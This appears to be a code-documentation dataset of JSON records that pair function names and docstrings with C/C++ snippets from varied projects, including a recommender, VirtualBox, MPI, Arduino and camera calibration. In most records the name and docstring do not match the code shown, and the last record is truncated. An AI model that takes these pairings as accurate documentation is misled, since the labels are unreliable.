{"content":"{'function_name': 'populate_movies_to_array', 'docstring': '\/\/ Fill the array of vectors with the movies that each user rated', 'code': 'double predict_score(double** U, double** V, double** SumMW,\\n                     int i, int j, double b_u, double b_i, double sqrt_r){\\n    \/*\\n    PARAMETERS\\n    U:      USER_SIZE by LATENT_FACTORS matrix\\n    V:      MOVIE_SIZE by LATENT_FACTORS matrix\\n    SumMW:  USER_SIZE by LATENT_FACTORS matrix\\n    i:      user index, userId - 1\\n    j:      movie index, movieId - 1\\n    b_u:    bias from the user\\n    b_i:    bias from the movie\\n    sqrt_r: (number of movies rated by this user)^-1\/2\\n\\n    RETURNS\\n    prediction for this user and movie combo\\n    *\/\\n\\n    double tmp = 0.0;\\n    for(int k = 0; k < LATENT_FACTORS; k++){\\n        tmp += (U[i][k] + SumMW[i][k] * sqrt_r) * V[j][k];\\n    }\\n    double score = TRAINING_DATA_AVERAGE + b_u + b_i + tmp;\\n    if(score > 5){\\n        score = 5;\\n    }\\n    if(score < 1){\\n        score = 1;\\n    }\\n    return score;\\n}'}","id":4861}
{"content":"{'function_name': 'cpumR0SaveHostDebugState', 'docstring': '\/*\\n     * Make sure DR7 is harmless or else we could trigger breakpoints when\\n     * load guest or hypervisor DRx values later.\\n     *\/', 'code': \"CPUMR0DebugStateMaybeSaveGuestAndRestoreHost(PVMCPU pVCpu, bool fDr6)\\n{\\n    Assert(!RTThreadPreemptIsEnabled(NIL_RTTHREAD));\\n    bool const fDrXLoaded = RT_BOOL(pVCpu->cpum.s.fUseFlags & (CPUM_USED_DEBUG_REGS_GUEST | CPUM_USED_DEBUG_REGS_HYPER));\\n\\n    \/*\\n     * Do we need to save the guest DRx registered loaded into host registers?\\n     * (DR7 and DR6 (if fDr6 is true) are left to the caller.)\\n     *\/\\n    if (pVCpu->cpum.s.fUseFlags & CPUM_USED_DEBUG_REGS_GUEST)\\n    {\\n#if HC_ARCH_BITS == 32 && defined(VBOX_WITH_64_BITS_GUESTS)\\n        if (CPUMIsGuestInLongModeEx(&pVCpu->cpum.s.Guest))\\n        {\\n            uint64_t uDr6 = pVCpu->cpum.s.Guest.dr[6];\\n            HMR0SaveDebugState(pVCpu->CTX_SUFF(pVM), pVCpu, &pVCpu->cpum.s.Guest);\\n            if (!fDr6)\\n                pVCpu->cpum.s.Guest.dr[6] = uDr6;\\n        }\\n        else\\n#endif\\n        {\\n            pVCpu->cpum.s.Guest.dr[0] = ASMGetDR0();\\n            pVCpu->cpum.s.Guest.dr[1] = ASMGetDR1();\\n            pVCpu->cpum.s.Guest.dr[2] = ASMGetDR2();\\n            pVCpu->cpum.s.Guest.dr[3] = ASMGetDR3();\\n            if (fDr6)\\n                pVCpu->cpum.s.Guest.dr[6] = ASMGetDR6();\\n        }\\n    }\\n    ASMAtomicAndU32(&pVCpu->cpum.s.fUseFlags, ~(  CPUM_USED_DEBUG_REGS_GUEST | CPUM_USED_DEBUG_REGS_HYPER\\n                                                | CPUM_SYNC_DEBUG_REGS_GUEST | CPUM_SYNC_DEBUG_REGS_HYPER));\\n\\n    \/*\\n     * Restore the host's debug state. DR0-3, DR6 and only then DR7!\\n     *\/\\n    if (pVCpu->cpum.s.fUseFlags & CPUM_USED_DEBUG_REGS_HOST)\\n    {\\n        \/* A bit of paranoia first... *\/\\n        uint64_t uCurDR7 = ASMGetDR7();\\n        if (uCurDR7 != X86_DR7_INIT_VAL)\\n            ASMSetDR7(X86_DR7_INIT_VAL);\\n\\n        ASMSetDR0(pVCpu->cpum.s.Host.dr0);\\n        ASMSetDR1(pVCpu->cpum.s.Host.dr1);\\n        ASMSetDR2(pVCpu->cpum.s.Host.dr2);\\n        ASMSetDR3(pVCpu->cpum.s.Host.dr3);\\n        \/** @todo consider only updating if they differ, esp. DR6. Need to figure how\\n         *        expensive DRx reads are over DRx writes.  *\/\\n        ASMSetDR6(pVCpu->cpum.s.Host.dr6);\\n        ASMSetDR7(pVCpu->cpum.s.Host.dr7);\\n\\n        ASMAtomicAndU32(&pVCpu->cpum.s.fUseFlags, ~CPUM_USED_DEBUG_REGS_HOST);\\n    }\\n\\n    return fDrXLoaded;\\n}\"}","id":4866}
{"content":"{'function_name': 'complex_modMulScalar', 'docstring': '\/\/ \\\\f$(r \\\\cdot s \\\\mod p, i \\\\cdot s \\\\mod p)\\\\f$.', 'code': 'CryptidStatus complex_multiplicativeInverse(Complex *result, const Complex complex, const mpz_t p)\\n{\\n    mpz_t real, imaginary, denom, realSquare, imagSquare, denomInv, negImag;;\\n\\n    \/\/ (0, 0) has no multiplicative inverse.\\n    if(!mpz_cmp_ui(complex.real, 0) && !mpz_cmp_ui(complex.imaginary, 0))\\n    {\\n        return CRYPTID_HAS_NO_MUL_INV_ERROR;\\n    }\\n\\n    mpz_inits(real, imaginary, denom, realSquare, imagSquare, denomInv, negImag, NULL);\\n\\n    \/\/ If the Complex instance only holds a real value, we can fallback to\\n    \/\/ simple inverse: \\\\f$(r^{-1}, 0)\\\\f$.\\n    if(!mpz_cmp_ui(complex.imaginary, 0))\\n    {\\n        mpz_invert(real, complex.real, p);\\n        complex_initMpzLong(result, real, 0);\\n        \\n        mpz_clears(real, imaginary, denom, realSquare, imagSquare, denomInv, negImag, NULL);\\n        return CRYPTID_SUCCESS;\\n    }\\n\\n    \/\/ Likewise, if the Complex instance only holds an imaginary value, we\\n    \/\/ can simplify things: \\\\f$(0, -i^{-1})\\\\f$.\\n    if(!mpz_cmp_ui(complex.real, 0))\\n    {\\n        mpz_invert(imaginary, complex.imaginary, p);\\n        mpz_neg(imaginary, imaginary);\\n        mpz_mod(imaginary, imaginary, p);\\n        complex_initLongMpz(result, 0, imaginary);\\n\\n        mpz_clears(real, imaginary, denom, realSquare, imagSquare, denomInv, negImag, NULL);\\n        return CRYPTID_SUCCESS;\\n    }\\n\\n    mpz_pow_ui(realSquare, complex.real, 2);\\n    mpz_pow_ui(imagSquare, complex.imaginary, 2);\\n    mpz_add(denom, realSquare, imagSquare);\\n    mpz_mod(denom, denom, p);\\n\\n    mpz_invert(denomInv, denom, p);\\n\\n    mpz_mul(real, complex.real, denomInv);\\n    mpz_mod(real, real, p);\\n\\n    mpz_neg(negImag, complex.imaginary);\\n    mpz_mod(negImag, negImag, p);\\n\\n    mpz_mul(imaginary, negImag, denomInv);\\n    mpz_mod(imaginary, imaginary, p);\\n\\n    complex_initMpz(result, real, imaginary);\\n    mpz_clears(real, imaginary, denom, realSquare, imagSquare, denomInv, negImag, NULL);\\n    return CRYPTID_SUCCESS;\\n}'}","id":4879}
{"content":"{'function_name': 'executingThread', 'docstring': '\/\/\u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0431\u043b\u043e\u043a', 'code': 'int main() {\\n\\t\/\/\u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0440\u0443\u0441\u0441\u043a\u0443\u044e \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0443\\n\\tSetConsoleCP(1251); SetConsoleOutputCP(1251);\\n\\tsetlocale(LC_ALL, \"Russian\");\\n\\n\\tsf::Thread thread(&executingThread, &window);\\n\\tthread.launch();\\n\\tsf::Texture texture;\\n\\ttexture.loadFromFile(\"bg\/nicebackground.jpg\", sf::IntRect(0, 0, winw, winh));\\n\\tsf::Sprite back;\\n\\tback.setTexture(texture);\\n\\tsf::Font font;\\n\\tfont.loadFromFile(\"fonts\/OpenSans-Regular.ttf\");\\n\\ttext.setFont(font);\\n\\twhile (window.isOpen())\\n\\t{\\n\\t\\tif (!executing)\\n\\t\\t\\twindow.close();\\n\\n\\t\\tsf::Event event;\\n\\t\\twhile (window.pollEvent(event))\\n\\t\\t{\\n\\t\\t\\tif (!executing) {\\n\\t\\t\\t\\twindow.close();\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\t\\tif (event.type == sf::Event::Closed) {\\n\\t\\t\\t\\twaiting = false;\\n\\t\\t\\t\\texecuting = false;\\n\\t\\t\\t\\twindow.close();\\n\\t\\t\\t}\\n\\t\\t\\tif (choosing) {\\n\\t\\t\\t\\tif (event.type == sf::Event::MouseButtonPressed) {\\n\\t\\t\\t\\t\\tchosen = -1;\\n\\t\\t\\t\\t\\tfor (int i = 0; i < variants.size(); i++) {\\n\\t\\t\\t\\t\\t\\tint y = winh \/ 2 - variants.size() * text.getCharacterSize() + i * text.getCharacterSize() * 1.5;\\n\\t\\t\\t\\t\\t\\tint my = sf::Mouse::getPosition().y - window.getPosition().y - text.getCharacterSize() * 1.5;\\n\\t\\t\\t\\t\\t\\tif ((my >= y - text.getCharacterSize() \/ 2) && (my <= y + text.getCharacterSize() \/ 2)) chosen = i;\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\tif (chosen > -1) waiting = false;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\telse {\\n\\t\\t\\t\\tif (event.type == sf::Event::MouseButtonPressed)\\n\\t\\t\\t\\t\\twaiting = false;\\n\\t\\t\\t\\tif (event.type == sf::Event::KeyPressed)\\n\\t\\t\\t\\t\\twaiting = false;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\twindow.clear(sf::Color::Black);\\n\\t\\tRoundedRect rect(20, sf::Vector2f(winw-20, 180));\\n\\t\\trect.setPosition(10, winh-190);\\n\\t\\trect.setFillColor(sf::Color(0, 100, 200, 200));\\n\\t\\trect.setOutlineThickness(3);\\n\\t\\trect.setOutlineColor(sf::Color(0, 100, 200, 240));\\n\\t\\twindow.draw(back);\\n\\t\\tif (choosing) {\\n\\t\\t\\tsf::RectangleShape blur(sf::Vector2f(winw, winh));\\n\\t\\t\\tblur.setFillColor(sf::Color(0, 0, 0, 200));\\n\\t\\t\\twindow.draw(blur);\\n\\t\\t\\tfor (int i = 0; i < variants.size(); i++) {\\n\\t\\t\\t\\ttext.setCharacterSize(50);\\n\\t\\t\\t\\tint x = (winw - variants[i].size() * text.getCharacterSize()) \/ 2;\\n\\t\\t\\t\\tint y = winh \/ 2 - variants.size() * text.getCharacterSize() + i * text.getCharacterSize() * 1.5;\\n\\t\\t\\t\\ttext.setPosition(x, y);\\n\\t\\t\\t\\tint my = sf::Mouse::getPosition().y - window.getPosition().y - text.getCharacterSize() * 1.5;\\n\\t\\t\\t\\tif ((my >= y - text.getCharacterSize() \/ 2) && (my <= y + text.getCharacterSize() \/ 2))\\n\\t\\t\\t\\t\\ttext.setFillColor(sf::Color(150, 150, 150));\\n\\t\\t\\t\\telse text.setFillColor(sf::Color::White);\\n\\t\\t\\t\\ttext.setString(variants[i]);\\n\\t\\t\\t\\twindow.draw(text);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\ttext.setFillColor(sf::Color::White);\\n\\t\\t\\ttext.setCharacterSize(30);\\n\\t\\t\\ttext.setPosition(20, winh - 180);\\n\\t\\t\\twindow.draw(rect);\\n\\t\\t\\twindow.draw(text);\\n\\t\\t}\\n\\t\\twindow.display();\\n\\t}\\n\\t\/\/return 0\\n\\treturn 0;\\n}'}","id":4880}
{"content":"{'function_name': 'get_sum', 'docstring': '\/\/\u6c42[l,r]\u7684\u548c ', 'code': 'int max_sum(){\/\/\u6c42\u6700\u5927\u7684\u533a\u95f4\u503c \\n\\tupdate(root); \\n\\treturn root->maxt;\\n}'}","id":4885}
{"content":"{'function_name': 'uint_spearman', 'docstring': '\/\/ create workspace', 'code': 'inline double uint_spearman( T const& data1, U const& data2, double work[] ){\\n      if( 0 != work )\\n\\treturn gsl_stats_uint_spearman( data1, 1, data2, 1, data1.size(), work );\\n      \/\/ create workspace\\n      double* workspace = new double[2 * data1.size()];\\n      double result = gsl_stats_uint_spearman( data1, 1, data2, 1, data1.size(), workspace );\\n      delete[] workspace;\\n      return result;\\n    }'}","id":4887}
{"content":"{'function_name': 'StartDeviceCompletionRoutine', 'docstring': '\/\/ above us may examine the flag as part of their own start-device processing, too.\\r', 'code': 'NTSTATUS UsageNotificationCompletionRoutine(PDEVICE_OBJECT fido, PIRP Irp, PDEVICE_EXTENSION pdx)\\r\\n\\t{\\t\\t\\t\\t\\t\\t\\t\/\/ UsageNotificationCompletionRoutine\\r\\n\\tif (Irp->PendingReturned)\\r\\n\\t\\tIoMarkIrpPending(Irp);\\r\\n\\r\\n\\t\/\/ If lower driver cleared pageable flag, we must do the same\\r\\n\\r\\n\\tif (!(pdx->LowerDeviceObject->Flags & DO_POWER_PAGABLE))\\r\\n\\t\\tfido->Flags &= ~DO_POWER_PAGABLE;\\r\\n\\r\\n\\tIoReleaseRemoveLock(&pdx->RemoveLock, Irp);\\r\\n\\treturn STATUS_SUCCESS;\\r\\n\\t}'}","id":4888}
{"content":"{'function_name': 'track', 'docstring': '\/*if (distance1 + closetol1  < distance2 + closetol2 && distance1 - closetol1 < distance2 - closetol2 && currentPosition >=10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tdelay (5);\\n\\t\\t\\t\\tcurrentPosition = currentPosition - dTheta2 ;\\n\\t\\t\\t\\tturret.write(currentPosition );\\n\\t\\t\\t\\tSerial.println(\"Smallleft\");\\n\\t\\t\\t\\t\\n\\t\\t\\t}\\n\\tif (distance1 + closetol1 > distance2+closetol2  && distance1 - closetol1 > distance2-closetol2 && currentPosition<= 170)\\n\\t\\t{\\n\\t\\t\\tdelay (5);\\n\\t\\t\\tcurrentPosition = currentPosition + dTheta2;\\n\\t\\t\\tturret.write(currentPosition );\\n\\t\\t\\tSerial.println(\"smallRight\");\\n\\t\\t}\\n\\tif (distance1 + tol1  < distance2 + tol2 && distance1 - tol1 < distance2 - tol2 && currentPosition >=10)\\n\\t\\t{ \\n\\t\\t\\n   \\n\\t\\t delay (5);\\n\\t\\t currentPosition = currentPosition - dTheta ;\\n\\t\\t turret.write(currentPosition );\\n\\t\\t Serial.print(\"Bigleft\");\\n\\n\\t   }\\n\\t\\t\\n\\tif (distance1 + tol1 > distance2+tol2  && distance1 - tol1 > distance2-tol2 && currentPosition<= 170)\\n\\t   {\\n\\t\\t delay (5);\\n\\t\\t currentPosition = currentPosition + dTheta;\\n\\t\\t turret.write(currentPosition );\\n\\t\\t Serial.print(\"Bigright\");\\n\\n\\t\\t }\\n  *\/', 'code': 'int ultrasonicRoutine(int triggerpin, int echopin, int maxdistance) {\\n\\n\\tint readstart, readend, duration, distance;\\n\\n\\t\/\/ Start Reading\\n\\treadstart = millis();\\n\\t\\n\\t\/\/ Begin ping\\n\\tdigitalWrite(triggerpin, LOW);\\n\\tdelay(1);\\n\\tdigitalWrite(triggerpin, HIGH);\\n\\tdelay(1);\\n\\tdigitalWrite(triggerpin, LOW);\\n\\t\\n\\tduration = pulseIn(echopin, HIGH);\\n\\t\\n\\tdistance = (duration\/2) \/ 29.1;\\n\\n\\t\/\/ Storing distance value\\n\\tif(distance == 0 || distance > maxdistance) {\\n\\t\\tdistance = maxdistance;\\n\\t} else if(distance < 2 && distance != 0) {\\n\\t\\tdistance = ultrasonicRoutine(triggerpin,echopin,maxdistance);\\n\\t} else if(distance >= 2 && distance <= maxdistance) {\\n\\t\\tdistance = distance;\\n\\t}\\n\\n\\t\/\/ Checking the time since beginning of last reading (only to reduce time between pings, thus no need to add delay after function)\\n\\treadend = millis() - readstart;\\n\\tif(readend < 68) {\\n\\t\\tdelay(68 - readend);\\n\\t}\\n\\t\\n\\t\/\/ Return the distance\\n\\treturn distance;\\n}'}","id":4892}
{"content":"{'function_name': 'denoiseb_rd26_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd27_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd27 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1932 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_1932();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4898}
{"content":"{'function_name': 'MStart', 'docstring': '\/\/\u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043f\u0441\u0435\u0432\u0434\u043e\u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0440\u044f\u0434\u0430', 'code': 'int main(int argc, char **argv) {\\n\\tint i, j, k, prev, next;\\n\\tMPI_Status Status;\\n\\tMPI_Init(&argc, &argv);\\n\\tMPI_Comm_size(MPI_COMM_WORLD, &p);\\n\\tMPI_Comm_rank(MPI_COMM_WORLD, &myrank);\\n\\tif (myrank == ROOT) MStart();\\n\\n\\t\/\/  \u0441\u043e\u0440\u0442\u0440\u043e\u0432\u043a\u0430                         \\n\\tint bsize = n \/ p; \/\/\u0440\u0430\u0437\u043c\u0435\u0440 \u0431\u043b\u043e\u043a\u0430 \u0434\u043b\u044f \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430\\n\\tint* buf = (int*)malloc((bsize + 1) * sizeof(int));\\n\\t\/\/\u0440\u0430\u0441\u0441\u044b\u043b\u043a\u0430 \u043a\u0443\u0441\u043a\u043e\u0432 \u043c\u0430\u0441c\u0438\u0432\u0430 \u0432\u0441\u0435\u043c \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430\u043c\\n\\tMPI_Scatter(mas, bsize, MPI_INT, buf, bsize, MPI_INT, ROOT, MPI_COMM_WORLD);\\n\\tnext = myrank + 1;\\n\\tprev = myrank - 1;\\n\\t\/**\/\\n\\tfor (j = 0; j <= n - 1; j++)\\n\\t{\\n\\t\\t\/\/\u0427\u0435\u0442\u043d\u044b\u0439 \u043f\u0440\u043e\u0445\u043e\u0434\\n\\t\\tfor (i = 0; i <= bsize - 2; i += 2)\\n\\t\\t\\tif (buf[i]>buf[i + 1]) {\\n\\t\\t\\t\\tk = buf[i];\\n\\t\\t\\t\\tbuf[i] = buf[i + 1];\\n\\t\\t\\t\\tbuf[i + 1] = k;\\n\\t\\t\\t}\\n\\t\\tif (next<p) MPI_Send(&buf[bsize], 1, MPI_INT, next, 1, MPI_COMM_WORLD);\\n\\t\\tif (prev >= 0) MPI_Recv(&buf[0], 1, MPI_INT, prev, 1, MPI_COMM_WORLD, &Status);\\n\\n\\t\\t\/\/\u041d\u0435\u0447\u0435\u0442\u043d\u044b\u0439 \u043f\u0440\u043e\u0445\u043e\u0434    \\n\\t\\tfor (i = 1; i <= bsize - 1; i += 2)\\n\\t\\t\\tif (buf[i]>buf[i + 1]) {\\n\\t\\t\\t\\tk = buf[i];\\n\\t\\t\\t\\tbuf[i] = buf[i + 1];\\n\\t\\t\\t\\tbuf[i + 1] = k;\\n\\t\\t\\t}\\n\\t\\tif (next<p) MPI_Send(&buf[bsize], 1, MPI_INT, next, 1, MPI_COMM_WORLD);\\n\\t\\tif (prev >= 0) MPI_Recv(&buf[0], 1, MPI_INT, prev, 1, MPI_COMM_WORLD, &Status);\\n\\t}\\n\\t\\n\\t\/\/\u0441\u0431\u043e\u0440\u043a\u0430 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0438\u0437 \u043a\u0443\u0441\u043a\u043e\u0432\\n\\tMPI_Gather(buf, bsize, MPI_INT, mas, bsize, MPI_INT, ROOT, MPI_COMM_WORLD);\\n\\n\\tfree(buf);\\n\\tif (myrank == ROOT) MFinish();\\n\\tMPI_Finalize();\\n\\n\\treturn 0;\\n}'}","id":4900}
{"content":"{'function_name': 'denoiseb_rd49_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd5_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd5 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3862 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_3862();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4902}
{"content":"{'function_name': 'large_add_from', 'docstring': '\/\/ handle overflow', 'code': 'fastfloat_really_inline uint32_t  parse_eight_digits_unrolled(uint64_t val) {\\n  const uint64_t mask = 0x000000FF000000FF;\\n  const uint64_t mul1 = 0x000F424000000064; \/\/ 100 + (1000000ULL << 32)\\n  const uint64_t mul2 = 0x0000271000000001; \/\/ 1 + (10000ULL << 32)\\n  val -= 0x3030303030303030;\\n  val = (val * 10) + (val >> 8); \/\/ val = (val * 2561) >> 8;\\n  val = (((val & mask) * mul1) + (((val >> 16) & mask) * mul2)) >> 32;\\n  return uint32_t(val);\\n}'}","id":4906}
{"content":"{'function_name': 'find_if_beacon_off_2', 'docstring': '\/\/_seriaL.println((flame_c_sum + flame_d_sum)\/10);', 'code': 'float offset_headingdegrees(){  \/\/\u5168\u5c40\u53d8\u91cf HeadingInit  \u5c06\u5750\u6807\u8c03\u6574\u4e3a\u4ee5\u521d\u59cb\u503c\u6307\u5411\u4e3a180\u5ea6\u7684\u8bfb\u6570\u8303\u56f4\\n\\tfloat off_heading=headingdegrees()+(180-HeadingInit);\\n\\tif(off_heading>=360)off_heading-=360;\\n\\telse if(off_heading<0)off_heading+=360;\\n \/\/ _seriaL.print(\"off_heading  \");\\n \/\/ _seriaL.println(off_heading);\\n ScreenData[3] = off_heading;\\n\\treturn off_heading;\\n}'}","id":4907}
{"content":"{'function_name': 'main', 'docstring': '\/\/\u30d5\u30c3\u30af\u5143\u547c\u3073\u51fa\u3057\u306a\u3069\u306e\u30c6\u30b9\u30c8', 'code': 'SEXYHOOK_BEGIN(int,SEXYHOOK_CLASS,&classMethodCallTest::Add,(int a))\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/\u5143\u306e\u95a2\u6570\u3092\u547c\u3073\u51fa\u3059\\n\\t\\t\\t\\treturn CallOriginalFunction(a);\\n\\t\\t\\t}'}","id":4916}
{"content":"{'function_name': 'DoSparseCompress', 'docstring': '\/\/ 1. coor_best_bit 2. nz_cnt 3. quant_data_set size 4. unique_values 5. unique_value indexing 6. nz values coord', 'code': 'int IndexingCompress(const ParameterPtr &weight, const std::set<T> &quant_data_set,\\n                       const std::map<T, size_t> &unique_value_index_map, size_t unique_value_bit,\\n                       size_t unique_value_cnt, size_t pack_repetition_size_in_byte, size_t bit_num) {\\n    std::vector<bool> bits(pack_repetition_size_in_byte * k8Bit);\\n    size_t index = 0;\\n    \/\/ write unique_value_cnt: bit_num bit for unsigned\\n    for (size_t i = 0; i < bit_num; i++) {\\n      bits[index++] = (unique_value_cnt >> (bit_num - i - 1)) & (0x1);\\n    }\\n    \/\/ write the unique value set: each value has bit_num bit signed\\n    for (auto iter = quant_data_set.cbegin(); iter != quant_data_set.cend(); ++iter) {\\n      for (size_t i = 0; i < bit_num; i++) {\\n        bits[index++] = ((*iter + (1 << (bit_num - 1))) >> (bit_num - i - 1)) & (0x1);\\n      }\\n    }\\n\\n    auto tensor_info = weight->default_param()->cast<tensor::TensorPtr>();\\n    CHECK_NULL_RETURN(tensor_info);\\n    auto max_size = tensor_info->Size();\\n    auto quant_data = static_cast<T *>(tensor_info->data().data());\\n    \/\/ write the index: each index has unique_value_bit unsigned\\n    for (size_t i = 0; i < max_size; i++) {\\n      auto quant_value = quant_data[i];\\n      for (size_t j = 0; j < unique_value_bit; j++) {\\n        bits[index++] = (unique_value_index_map.at(quant_value) >> (unique_value_bit - j - 1)) & (0x1);\\n      }\\n    }\\n    if (index > pack_repetition_size_in_byte * k8Bit) {\\n      MS_LOG(ERROR) << \"unexpected index: \" << index << \" should not be greater than \"\\n                    << pack_repetition_size_in_byte * k8Bit;\\n      return RET_ERROR;\\n    }\\n\\n    auto ret = SetNewCompressionTensor(weight, bits, bit_num, tensor_info, mindspore::kIndexing);\\n    if (ret != RET_OK) {\\n      MS_LOG(ERROR) << \"Add New tensor failed.\";\\n      return RET_ERROR;\\n    }\\n    return RET_OK;\\n  }'}","id":4927}
{"content":"{'function_name': 'x86GetNscId', 'docstring': '\/* - Basic identification -\\n  ** ID = 0x504x : Geode GX1\\n  ** ID = 0x505x : Geode GX2\\n  ** ID = 0x50Ax : Geode LX\\n  *\/', 'code': 'static u32 x86GetSisId(u32 maxfunc)\\n{\\n  \/* - Basic identification -\\n  ** ID = 0x500x : 55x\\n  *\/\\n  return x86GetDefaultId(maxfunc) | (VENDOR_SIS << 28);\\n}'}","id":4929}
{"content":"{'function_name': 'outputCameraParam', 'docstring': '\/*\u4fdd\u5b58\u6570\u636e*\/', 'code': 'int main()\\n{\\n\\n\\tcout << \"\u8fdb\u884c\u53cc\u76ee\u6807\u5b9a\uff0c\u8bf7\u5148\u786e\u8ba4\u5df2\u8fdb\u884c\u5355\u76ee\u6807\u5b9a\\\\n\u8bf7\u8f93\u5165\u5de6\u6444\u50cf\u5934\u548c\u53f3\u6444\u50cf\u5934\u7684ID\uff1a\";\\n\\tcin >> lid >> rid;\\n\\tlCapture.open(lid);\\n\\trCapture.open(rid);\\n\\n\\twhile (!lCapture.isOpened() || !rCapture.isOpened()) {\\n\\t\\tcout << \"\u5de6\u6444\u50cf\u5934\u6253\u5f00\uff1a\" << lCapture.isOpened() << \" \u53f3\u6444\u50cf\u5934\u6253\u5f00\uff1a\" << rCapture.isOpened() << \" \u8bf7\u91cd\u8bd5\uff1a\";\\n\\t\\tcin >> lid >> rid;\\n\\t\\tlCapture.open(lid);\\n\\t\\trCapture.open(rid);\\n\\t}\\n\\n\\timageWidth = lCapture.get(CAP_PROP_FRAME_WIDTH);\\n\\timageHeight = lCapture.get(CAP_PROP_FRAME_HEIGHT);\\n\\timageSize = Size(imageWidth, imageHeight);\\n\\n\\tif (!loadCameraParams()) {\\n\\t\\tcout << \"\u65e0\u6cd5\u52a0\u8f7d\u6240\u6709\u7684\u76f8\u673a\u53c2\u6570\uff01\";\\n\\t\\treturn -1;\\n\\t}\\n\\n\\tcout << \"\u6309\u4e0b C \u6765\u6293\u53d6\u4e00\u5f20\u56fe\u7247\\\\n\u6309\u4e0b ESC \u9000\u51fa\u7a0b\u5e8f\" << endl;\\n\\n\\tint goodFrameCount = 0;\\n\\twhile (goodFrameCount < frameNumber) {\\n\\t\\tlCapture >> rgbImageL;\\n\\t\\trCapture >> rgbImageR;\\n\\t\\n\\t\\tcvtColor(rgbImageL, grayImageL, CV_BGR2GRAY);\\n\\t\\tcvtColor(rgbImageR, grayImageR, CV_BGR2GRAY);\\n\\t\\timshow(\"Camera L\", grayImageL);\\n\\t\\timshow(\"Camera R\", grayImageR);\\n\\n\\t\\tchar c = waitKey(10);\\n\\n\\t\\tif (c == 27) \/\/\u9000\u51fa\\n\\t\\t\\treturn 0;\\n\\t\\telse if (c == \\'c\\') {\/\/\u62cd\u7167\u5e76\u68c0\u6d4b\\n\\t\\t\\tbool isFindL = findChessboardCorners(grayImageL, boardSize, cornerL);\\n\\t\\t\\tbool isFindR = findChessboardCorners(grayImageR, boardSize, cornerR);\\n\\t\\t\\tif (isFindL && isFindR )\\t \/\/\u5982\u679c\u4e24\u5e45\u56fe\u50cf\u90fd\u627e\u5230\u4e86\u6240\u6709\u7684\u89d2\u70b9 \u5219\u8bf4\u660e\u8fd9\u4e24\u5e45\u56fe\u50cf\u662f\u53ef\u884c\u7684\\n\\t\\t\\t{\\n\\n\\t\\t\\t\\t\/\/\u5199\u5165\u6587\u4ef6\\n\\t\\t\\t\\tchar lName[10];\\n\\t\\t\\t\\tchar rName[10];\\n\\t\\t\\t\\tsprintf_s(lName, \"L%d.jpg\",goodFrameCount);\\n\\t\\t\\t\\tsprintf_s(rName, \"R%d.jpg\", goodFrameCount);\\n\\t\\t\\t\\timwrite(lName, rgbImageL);\\n\\t\\t\\t\\timwrite(rName, rgbImageR);\\n\\n\\t\\t\\t\\t\/*\\n\\t\\t\\t\\tSize(5,5) \u641c\u7d22\u7a97\u53e3\u7684\u4e00\u534a\u5927\u5c0f\\n\\t\\t\\t\\tSize(-1,-1) \u6b7b\u533a\u7684\u4e00\u534a\u5c3a\u5bf8\\n\\t\\t\\t\\tTermCriteria(CV_TERMCRIT_EPS | CV_TERMCRIT_ITER, 